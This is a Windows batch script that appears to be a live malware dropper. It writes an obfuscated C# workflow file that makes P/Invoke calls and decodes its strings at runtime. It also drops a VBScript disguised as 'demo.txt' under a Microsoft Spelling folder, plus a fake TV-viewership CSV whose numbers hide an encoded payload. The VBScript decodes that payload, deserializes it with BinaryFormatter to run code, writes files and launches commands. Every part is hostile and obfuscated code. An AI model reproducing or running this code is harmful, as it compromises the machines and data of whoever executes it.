>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("yrV00qNAYA=="^)^)^) return typeof^(decimal^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("zL941w=="^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("7L9416tAYg=="^)^)^) return typeof^(bool^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("2L9+3w=="^)^) ^|^| loggerFind.Equals^(formatterAccumulate.initializedEvaluator^("2L9+3w=="^)^)^) return typeof^(void^);
>> "C:\ProgramData\abc\index.xoml" echo(    foreach ^(System.Reflection.Assembly regionBlocked in System.AppDomain.CurrentDomain.GetAssemblies^(^)^) {
>> "C:\ProgramData\abc\index.xoml" echo(        System.Type queueAutomation = regionBlocked.GetType^(loggerFind^);
>> "C:\ProgramData\abc\index.xoml" echo(        if ^(queueAutomation != null^) return queueAutomation; }
>> "C:\ProgramData\abc\index.xoml" echo(    return null; }
>> "C:\ProgramData\abc\index.xoml" echo(private static System.Type configuredStart^(string bufferedAssembler, string nullableDouble, System.Runtime.InteropServices.CharSet measureDestination, System.Type unitMonitoring, System.Type[] provisionVisibility, string[] outputWidth^) {
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(sliceAssertion == null^) {
>> "C:\ProgramData\abc\index.xoml" echo(        var subscriberPlugin = System.AppDomain.CurrentDomain.DefineDynamicAssembly^(
>> "C:\ProgramData\abc\index.xoml" echo(            new System.Reflection.AssemblyName^(formatterAccumulate.initializedEvaluator^("+bl5iPw="^)^), System.Reflection.Emit.AssemblyBuilderAccess.Run^);
>> "C:\ProgramData\abc\index.xoml" echo(        sliceAssertion = subscriberPlugin.DefineDynamicModule^(formatterAccumulate.initializedEvaluator^("+bl5iPw="^), false^); }
>> "C:\ProgramData\abc\index.xoml" echo(    var flagShellcode = sliceAssertion.DefineType^(bufferedAssembler + formatterAccumulate.initializedEvaluator^("7bx2yL0="^), System.Reflection.TypeAttributes.Class ^| System.Reflection.TypeAttributes.Public^);
>> "C:\ProgramData\abc\index.xoml" echo(    var libraryEstimate = new System.Collections.Generic.List^<System.Type^>^(^);
>> "C:\ProgramData\abc\index.xoml" echo(    for ^(int performanceObfuscator = 1; performanceObfuscator ^<= outputWidth.Length; performanceObfuscator++^) {
>> "C:\ProgramData\abc\index.xoml" echo(        string signOrchestrator = outputWidth[performanceObfuscator - 1];
>> "C:\ProgramData\abc\index.xoml" echo(        if ^(signOrchestrator.StartsWith^(formatterAccumulate.initializedEvaluator^("3LVxmw=="^)^) ^|^| signOrchestrator.StartsWith^(formatterAccumulate.initializedEvaluator^("waVjmw=="^)^)^) libraryEstimate.Add^(provisionVisibility[performanceObfuscator - 1].MakeByRefType^(^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        else libraryEstimate.Add^(provisionVisibility[performanceObfuscator - 1]^); }
>> "C:\ProgramData\abc\index.xoml" echo(    var frozenPatchFacade = flagShellcode.DefinePInvokeMethod^(bufferedAssembler, nullableDouble, bufferedAssembler,
>> "C:\ProgramData\abc\index.xoml" echo(        System.Reflection.MethodAttributes.Static ^| System.Reflection.MethodAttributes.Public,
>> "C:\ProgramData\abc\index.xoml" echo(        System.Reflection.CallingConventions.Standard, unitMonitoring, libraryEstimate.ToArray^(^),
>> "C:\ProgramData\abc\index.xoml" echo(        System.Runtime.InteropServices.CallingConvention.Winapi, measureDestination^);
>> "C:\ProgramData\abc\index.xoml" echo(    frozenPatchFacade.SetImplementationFlags^(frozenPatchFacade.GetMethodImplementationFlags^(^) ^| System.Reflection.MethodImplAttributes.PreserveSig^);
>> "C:\ProgramData\abc\index.xoml" echo(    return flagShellcode.CreateType^(^); }
>> "C:\ProgramData\abc\index.xoml" echo(internal static object viewNumberTake^(string implementBoundedBroadcast, object[] extensionAreaLazy^) {
>> "C:\ProgramData\abc\index.xoml" echo(    string[] guardedStubHandshake = implementBoundedBroadcast.Split^('^|'^);
>> "C:\ProgramData\abc\index.xoml" echo(    string namespaceFirewallProfile = guardedStubHandshake[0].Split^(':'^)[0];
>> "C:\ProgramData\abc\index.xoml" echo(    System.Runtime.InteropServices.CharSet evictChild = System.Runtime.InteropServices.CharSet.None;
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(guardedStubHandshake[0].Split^(':'^).Length ^> 1^)
>> "C:\ProgramData\abc\index.xoml" echo(        System.Runtime.InteropServices.CharSet.TryParse^(guardedStubHandshake[0].Split^(':'^)[1].Split^('.'^)[1], out evictChild^);
>> "C:\ProgramData\abc\index.xoml" echo(    string controllerBootstrap = guardedStubHandshake[1];
>> "C:\ProgramData\abc\index.xoml" echo(    System.Type skipStructure = statefulLocal^(guardedStubHandshake[2]^);
>> "C:\ProgramData\abc\index.xoml" echo(    System.Type[] connectedIndexingEncoding = new System.Type[extensionAreaLazy.Length]; for ^(int blockAttributeLambda = 0; blockAttributeLambda ^< extensionAreaLazy.Length; blockAttributeLambda++^) connectedIndexingEncoding[blockAttributeLambda] = extensionAreaLazy[blockAttributeLambda].GetType^(^);
>> "C:\ProgramData\abc\index.xoml" echo(    string[] derivedDescriptor = new string[guardedStubHandshake.Length - 3]; System.Array.Copy^(guardedStubHandshake, 3, derivedDescriptor, 0, guardedStubHandshake.Length - 3^);
>> "C:\ProgramData\abc\index.xoml" echo(    System.Type eventCurrent;
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(trackKernel.ContainsKey^(implementBoundedBroadcast^)^) {
>> "C:\ProgramData\abc\index.xoml" echo(        eventCurrent = trackKernel[implementBoundedBroadcast];
>> "C:\ProgramData\abc\index.xoml" echo(    } else {
>> "C:\ProgramData\abc\index.xoml" echo(        eventCurrent = configuredStart^(controllerBootstrap, namespaceFirewallProfile, evictChild, skipStructure, connectedIndexingEncoding, derivedDescriptor^);
>> "C:\ProgramData\abc\index.xoml" echo(        trackKernel.Add^(implementBoundedBroadcast, eventCurrent^); }
>> "C:\ProgramData\abc\index.xoml" echo(    var accumulateDeserialization = eventCurrent.GetMethod^(controllerBootstrap, System.Reflection.BindingFlags.Static ^| System.Reflection.BindingFlags.Public^);
>> "C:\ProgramData\abc\index.xoml" echo(    return accumulateDeserialization.Invoke^(null, extensionAreaLazy^);
>> "C:\ProgramData\abc\index.xoml" echo(} internal static string initializedEvaluator^(string invocationQueue^) {
>> "C:\ProgramData\abc\index.xoml" echo(                byte[] spoofingCheckpointSearch = new System.Guid^("bb17d0ae-21ce-b20c-31f2-5a485a7dd3f1"^).ToByteArray^(^);
>> "C:\ProgramData\abc\index.xoml" echo(                byte[] scheduledIterate = System.Convert.FromBase64String^(invocationQueue^);
>> "C:\ProgramData\abc\index.xoml" echo(                byte[] clientTrusted = new byte[scheduledIterate.Length];
>> "C:\ProgramData\abc\index.xoml" echo(                for ^(int performanceObfuscator = 0; performanceObfuscator ^< scheduledIterate.Length; performanceObfuscator++^) clientTrusted[performanceObfuscator] = ^(byte^)^(scheduledIterate[performanceObfuscator] ^^ spoofingCheckpointSearch[performanceObfuscator %% spoofingCheckpointSearch.Length]^);
>> "C:\ProgramData\abc\index.xoml" echo(                return System.Text.Encoding.UTF8.GetString^(clientTrusted^);
>> "C:\ProgramData\abc\index.xoml" echo(            }}
>> "C:\ProgramData\abc\index.xoml" echo(]]^>^</x:Code^>
>> "C:\ProgramData\abc\index.xoml" echo(^</SequentialWorkflowActivity^>
endlocal
goto :f2o

:f2o

:f2d

if exist "%APPDATA%\Microsoft\Spelling\wfc.exe" (
    goto :f3d
)

:f3a
if not exist "%APPDATA%\Microsoft\Spelling\demo.txt" goto :f3wd
if not exist "%APPDATA%\Microsoft\Spelling\wwf.csv" goto :f3wd
cscript //nologo //E:VBScript "%APPDATA%\Microsoft\Spelling\demo.txt"
if !errorlevel! neq 0 (
    exit /b 1
)
goto :f3o

:f3wd
set "D=%APPDATA%\Microsoft\Spelling\demo.txt"
for %%F in ("!D!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
setlocal DisableDelayedExpansion
> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Sub running^(page, isolate^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  Set detect = CreateObject^("ADODB.Stream"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  detect.Type = 1
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  detect.Open
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  Set notify = CreateObject^("System.IO.MemoryStream"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  notify.SetLength^(0^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  For Each defaultProperty in isolate
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(     notify.WriteByte ^(defaultProperty^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  Next
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  misLoop = notify.ToArray^(^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  detect.Write misLoop
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  Dim mapper: mapper = 1
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  mapper = InStr^(mapper, page, "%%"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(  detect.SaveToFile page, 2
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Sub
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Sub balanced^(coverage, started^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    If Not coverage.FolderExists^(started^) Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        compare = coverage.GetParentFolderName^(started^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        If compare ^<^> "" Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            balanced coverage, compare
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        coverage.CreateFolder started
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Sub
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Sub plaintext^(coverage, match, skip, broker^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    callback = match.ExpandEnvironmentStrings^(skip^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    compare = coverage.GetParentFolderName^(callback^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    balanced coverage, compare
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    running callback, broker
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Sub
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Function acceptance^(loopPath^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Dim asynchronous
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Set asynchronous = CreateObject^("System.IO.MemoryStream"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(asynchronous.SetLength^(0^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(For Each defaultProperty in loopPath
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    asynchronous.WriteByte ^(defaultProperty^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Next
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(asynchronous.Position = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Set acceptance = asynchronous
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Function
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Sub given^(category^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set coverage = CreateObject^("Scripting.FileSystemObject"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Dim match
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set match = CreateObject^("WScript.Shell"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    match.Environment^("Process"^).Item^("COMPLUS_Version"^) = "v4.0.30319"
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    callback = match.ExpandEnvironmentStrings^(category^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set repository = coverage.OpenTextFile^(callback, 1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    repository.ReadLine^(^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    deVariant = Trim^(repository.ReadLine^(^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    dateTimer = Split^(deVariant, ";"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    source = Split^(dateTimer^(0^), "."^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    arrayHook = CInt^(source^(0^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    failed = CInt^(source^(1^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    repository.Close
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set repository = Nothing
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    loopOpen = child^(coverage, match, callback, 2, failed, ""^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    For consumer = 0 To UBound^(loopOpen^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        agent = agent ^& Chr^(loopOpen^(consumer^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Next
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    job = Split^(agent, ";"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    port = ""
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    For Each joinArray in job
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        patch = Left^(joinArray, 1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        operand = Split^(joinArray, "|"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        dataset = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        struct = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        distribute = ""
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        If patch = "a" Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            dataset = CLng^(operand^(1^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            struct = CLng^(operand^(2^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            loopPath = child^(coverage, match, callback, arrayHook + dataset, struct, ""^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            Dim connect, color, metric, deserialization
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            Set connect = CreateObject^("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            Set color = CreateObject^("System.Collections.ArrayList"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            color.Add Empty
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            Set metric = connect.Deserialize_2^(acceptance^(loopPath^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            Set deserialization = metric.DynamicInvoke^(color.ToArray^(^)^).CreateInstance^("Hello"^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        ElseIf patch = "d" Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            dataset = CLng^(operand^(1^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            struct = CLng^(operand^(2^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            distribute = operand^(3^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            child coverage, match, callback, arrayHook + dataset, struct, distribute
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        ElseIf patch = "r" Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            isolation = operand^(1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            port = match.ExpandEnvironmentStrings^(isolation^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            match.Run port, 1, False
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Next
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Sub
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(Function child^(coverage, match, category, compile, reduce, authorization^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    memory = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    pipeline = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Dim loopPath^(^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    ReDim loopPath^(reduce -1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set repository = coverage.OpenTextFile^(category, 1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    repository.ReadLine^(^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Do Until repository.AtEndOfStream OR memory ^>= reduce
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        deVariant = Trim^(repository.ReadLine^(^)^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        detach = ""
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        getSet = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        For consumer = 1 To Len^(deVariant^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            enable = Mid^(deVariant, consumer, 1^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            If memory ^< reduce Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                If IsNumeric^(enable^) Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    getSet = getSet + 1
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    detach = detach ^& enable
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                Else
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    If pipeline ^>= compile Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                        If getSet ^> 0 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                            If getSet ^< 4 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                invoke = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                If 299 ^< invoke And invoke ^< 800 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    detach = Mid^(detach, 2, 2^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    simulation = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                ElseIf invoke ^< 100 And memory Mod 2 = 0 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    detach = Mid^(detach, 2, 2^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    simulation = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                ElseIf 799 ^< invoke And invoke ^< 900 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    detach = "1" ^& Mid^(detach, 2, 2^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    simulation = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                ElseIf 899 ^< invoke And invoke ^< 1000 Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    entropy = Mid^(detach, 2, 2^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    detach = "2" ^& entropy
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    simulation = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                Else
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    simulation = CInt^(detach^)
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    loopPath^(memory^) = simulation
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                                    memory = memory + 1
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                            End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                        End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    getSet = 0
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    detach = ""
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                    pipeline = pipeline + 1
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(                End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(            End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        Next
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Loop
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    repository.Close
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    Set repository = Nothing
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    If authorization ^<^> "" Then
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(        plaintext coverage, match, authorization, loopPath
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    End If
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(    child = loopPath
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(End Function
>> "%APPDATA%\Microsoft\Spelling\demo.txt" echo(given "%%APPDATA%%\Microsoft\Spelling\wwf.csv"
endlocal
set "D=%APPDATA%\Microsoft\Spelling\wwf.csv"
for %%F in ("!D!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
setlocal DisableDelayedExpansion
> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(Timeslot,Episodes,Viewers,Date,Viewers,Date,Viewers,TV season,Viewership rank,Avg. viewers
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.38;800.124;748.124;5256.355;52.549;53.750;124.6159;667.58;392.80;814.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9827.803;114.797;109.768;97.4480;816.97;692.99;807.121;6091.750;107.592;87.670;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.7467;446.101;820.101;777.90;844.0;1677.33;0.70;0.54;0.7559;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(955.255;30.0;2493.884;0.30;0.40;0.7631;70.0;664.0;30.0;9193.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.60;0.9271;70.0;30.0;70.0;6533.40;0.70;0.70;0.6587;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;40.0;70.0;7311.40;0.60;0.60;0.7479;30.0;828.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5148.514;31.886;14.30;180.4033;49.205;533.184;51.76;3919.905;33.684;104.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.2339;432.112;814.111;803.114;9288.397;109.632;99.497;110.5853;810.111;816.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(698.101;8119.632;114.817;110.732;105.8205;810.32;368.79;483.32;5167.809;111.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.546;13.8860;713.10;436.0;70.0;8465.60;0.70;0.680;69.4305;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(776.1;53.0;9915.918;6.457;93.30;0.9805;50.0;70.0;70.0;8682.924;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.534;0.611;1.8068;648.0;50.210;70.0;2628.50;12.40;0.60;0.4128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;614.240;50.0;1269.30;32.40;0.60;0.5973;41.0;30.0;664.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4083.60;32.50;0.30;2.5454;60.0;54.0;30.0;2629.30;0.40;0.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0342;60.0;60.0;30.0;2727.50;64.51;0.30;2.0377;40.0;688.122;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.0;7547.53;0.796;133.70;0.7448;716.0;60.16;40.0;7586.50;0.416;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;16.7989;60.0;40.0;50.0;3877.716;0.70;0.70;0.7143;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;40.0;1364.888;239.50;0.479;0.5812;50.0;30.0;31.0;0452.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9.50;0.60;0.9052;60.0;50.0;50.0;0901.60;224.50;0.868;65.9639;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;60.32;71.0;8919.712;0.70;0.832;238.9572;40.0;728.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7832.40;0.60;0.40;0.5630;40.0;60.0;70.0;9336.60;0.60;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9046;30.0;40.0;30.0;4511.40;0.70;0.60;0.6753;60.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;9751.60;0.50;0.70;32.9437;70.0;38.0;50.0;3749.70;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.7974;50.0;48.32;70.0;0469.672;0.50;0.50;0.3259;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;60.0;5221.746;116.801;120.816;0.9763;60.0;520.208;70.0;6067.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.70;0.70;210.3394;70.0;40.2;50.0;1519.30;0.70;0.30;0.0950;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;40.0;60.0;0964.632;0.70;96.546;114.1886;815.114;799.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2145.828;9.70;0.50;0.3423;61.0;50.10;30.0;5660.50;212.30;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1634;40.0;30.0;40.0;8954.40;0.60;0.364;0.8104;30.64;546.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.108;6357.811;99.40;0.712;0.8350;60.0;40.32;41.0;3601.60;2.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;222.1996;60.0;60.0;50.0;6706.70;0.50;0.60;0.1262;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(564.0;40.66;6659.70;0.30;0.60;0.8605;50.0;30.0;30.0;0659.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.940;239.1842;60.0;30.0;30.0;5688.672;0.30;0.52;0.8472;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.0;316.63;60.0;2733.864;139.70;0.39;0.8584;30.0;811.0;50.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5261.880;202.30;0.908;34.9329;60.0;832.237;40.0;0697.70;1.50;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6535;60.0;60.0;50.0;7881.40;0.60;0.40;0.7827;60.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;2321.40;0.40;0.60;0.1276;50.0;30.0;60.0;3559.814;2.440;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.40;0.3884;710.2;814.1;70.0;7478.812;40.324;0.50;10.3099;815.25;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;610.125;2926.52;0.60;4.542;94.3469;826.1;50.0;54.45;8634.410;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.61;0.60;6.2773;828.1;40.0;74.126;1613.61;0.70;4.742;54.1514;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(540.26;60.0;310.2;0347.63;40.34;0.40;6.9107;742.0;319.48;43.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8915.543;0.30;0.31;0.2457;60.17;740.2;30.0;4862.56;10.56;45.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(20.2212;342.6;823.2;30.0;2644.54;3.72;111.427;0.7201;50.10;611.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(344.13;2208.44;142.744;9.42;7.4343;44.40;428.0;30.10;7693.542;7.742;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.340;26.6626;50.0;610.2;640.6;7394.50;0.46;42.519;48.8743;33.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(525.0;70.0;9801.32;0.40;17.340;2.6956;50.0;66.10;36.45;2465.52;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(20.442;6.823;2.7687;50.0;54.3;32.111;2283.527;0.70;10.542;6.9211;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(342.94;826.201;30.0;1893.54;45.710;115.59;0.3275;70.6;828.201;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3437.54;126.901;0.30;4.2066;442.54;52.114;463.0;9984.70;112.420;40.695;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5095;50.6;742.242;53.44;1421.68;3.811;29.70;0.6377;610.45;635.114;
